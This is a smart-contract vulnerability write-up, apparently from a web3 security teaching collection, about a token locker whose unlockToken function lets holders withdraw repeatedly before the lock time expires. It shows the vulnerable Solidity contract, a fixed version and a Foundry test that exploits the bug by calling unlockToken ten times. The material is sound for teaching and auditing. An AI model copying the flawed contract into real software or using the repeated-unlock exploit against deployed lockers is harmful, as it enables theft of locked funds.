**Name**: Incorrect sanity checks - Multiple Unlocks Before Lock Time Elapse

**Description**: The bug lies in the unlockToken function, which lacks a check to ensure that block.timestamp is larger than locktime. This allows tokens to be unlocked multiple times before the lock period has elapsed, potentially leading to significant financial loss.

**Mitigation**:

Add a require statement to check that the current time is greater than the lock time before the tokens can be unlocked.

or fix:

```
uint256 amount = locker.amount;
if (block.timestamp > locker.lockTime) {
IERC20(locker.tokenAddress).transfer(msg.sender, amount);
locker.amount = 0;
}
```

**REF**: https://twitter.com/1nf0s3cpt/status/1681492477281468420

https://blog.decurity.io/dx-protocol-vulnerability-disclosure-bddff88aeb1d

**Vulnerable Contract:**

```
contract VulnerableBank {
    struct Locker {
        bool hasLockedTokens;
        uint256 amount;
        uint256 lockTime;
        address tokenAddress;
    }

    mapping(address => mapping(uint256 => Locker)) private _unlockToken;
    uint256 private _nextLockerId = 1;

    function createLocker(
        address tokenAddress,
        uint256 amount,
        uint256 lockTime
    ) public {
        require(amount > 0, "Amount must be greater than 0");
        require(lockTime > block.timestamp, "Lock time must be in the future");
        require(
            IERC20(tokenAddress).balanceOf(msg.sender) >= amount,
            "Insufficient token balance"
        );

        // Transfer the tokens to this contract
        IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount);

        // Create the locker
        Locker storage locker = _unlockToken[msg.sender][_nextLockerId];
        locker.hasLockedTokens = true;
        locker.amount = amount;
        locker.lockTime = lockTime;
        locker.tokenAddress = tokenAddress;

        _nextLockerId++;
    }

    function unlockToken(uint256 lockerId) public {
        Locker storage locker = _unlockToken[msg.sender][lockerId];
        // Save the amount to a local variable
        uint256 amount = locker.amount;
        require(locker.hasLockedTokens, "No locked tokens");

        // Incorrect sanity checks.
        if (block.timestamp > locker.lockTime) {
            locker.amount = 0;
        }

        // Transfer tokens to the locker owner
        // This is where the exploit happens, as this can be called multiple times
        // before the lock time has elapsed.
        IERC20(locker.tokenAddress).transfer(msg.sender, amount);
    }
}
```

Bug fixed Contract: (Purple Words)

```
contract FixedeBank {
    struct Locker {
        bool hasLockedTokens;
        uint256 amount;
        uint256 lockTime;
        address tokenAddress;
    }

    mapping(address => mapping(uint256 => Locker)) private _unlockToken;
    uint256 private _nextLockerId = 1;

    function createLocker(
        address tokenAddress,
        uint256 amount,
        uint256 lockTime
    ) public {
        require(amount > 0, "Amount must be greater than 0");
        require(lockTime > block.timestamp, "Lock time must be in the future");
        require(
            IERC20(tokenAddress).balanceOf(msg.sender) >= amount,
            "Insufficient token balance"
        );

        // Transfer the tokens to this contract
        IERC20(tokenAddress).transferFrom(msg.sender, address(this), amount);

        // Create the locker
        Locker storage locker = _unlockToken[msg.sender][_nextLockerId];
        locker.hasLockedTokens = true;
        locker.amount = amount;
        locker.lockTime = lockTime;
        locker.tokenAddress = tokenAddress;

        _nextLockerId++;
    }

    function unlockToken(uint256 lockerId) public {
        Locker storage locker = _unlockToken[msg.sender][lockerId];

        require(locker.hasLockedTokens, "No locked tokens");
        require(block.timestamp > locker.lockTime, "Tokens are still locked"); // Bug fixed
        // Save the amount to a local variable
        uint256 amount = locker.amount;

        // Mark the tokens as unlocked
        locker.hasLockedTokens = false;
        locker.amount = 0;

        // Transfer tokens to the locker owner
        IERC20(locker.tokenAddress).transfer(msg.sender, amount);
    }
}
```

***\*How to Test:\****

forge test --contracts src/test/Incorrect_sanity_checks.sol -vvvv

```
// Test function to demonstrate a vulnerability in the VulnerableBankContract.
function testVulnerableBank() public {
    // Log the current timestamp.
    console.log("Current timestamp", block.timestamp);

    // Initiate a "prank" with "alice" through the virtual machine (vm).
    // The specific behavior of the prank function is not evident from the provided code snippet.
    vm.startPrank(alice);

    // Approve the VulnerableBankContract to spend 10000 tokens from BanksLPContract on behalf of "alice."
    BanksLPContract.approve(address(VulnerableBankContract), 10000);

    // Log the balance of BanksLPContract for "alice" before creating the locker.
    console.log(
        "Before locking, my BanksLP balance",
        BanksLPContract.balanceOf(address(alice))
    );

    // Create a locker for 10000 tokens in the VulnerableBankContract, with a lock duration of 86400 seconds (1 day).
    VulnerableBankContract.createLocker(
        address(BanksLPContract),
        10000,
        86400
    );

    // Log the balance of BanksLPContract for "alice" before exploiting the locker.
    console.log(
        "Before exploiting, my BanksLP balance",
        BanksLPContract.balanceOf(address(alice))
    );

    // Exploit the locker in VulnerableBankContract by calling the 'unlockToken' function 10 times.
    // The exact vulnerability being exploited is not evident from the provided code snippet.
    for (uint i = 0; i < 10; i++) {
        VulnerableBankContract.unlockToken(1);
    }

    // Log the balance of BanksLPContract for "alice" after exploiting the locker.
    console.log(
        "After exploiting, my BanksLP balance",
        BanksLPContract.balanceOf(address(alice))
    );
}
```

Red box: unlocked multiple times before the lock period has elapsed. Purple box: issue fixed.

![img](https://web3sec.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F2a5f723a-59c1-40c1-95a8-2da1c9867ef1%2FUntitled.png?table=block&id=e7201e51-76b4-4575-a7e7-1ca2dc8d1fd3&spaceId=369b5001-5511-4fe6-a099-48af1d841f20&width=2000&userId=&cache=v2)

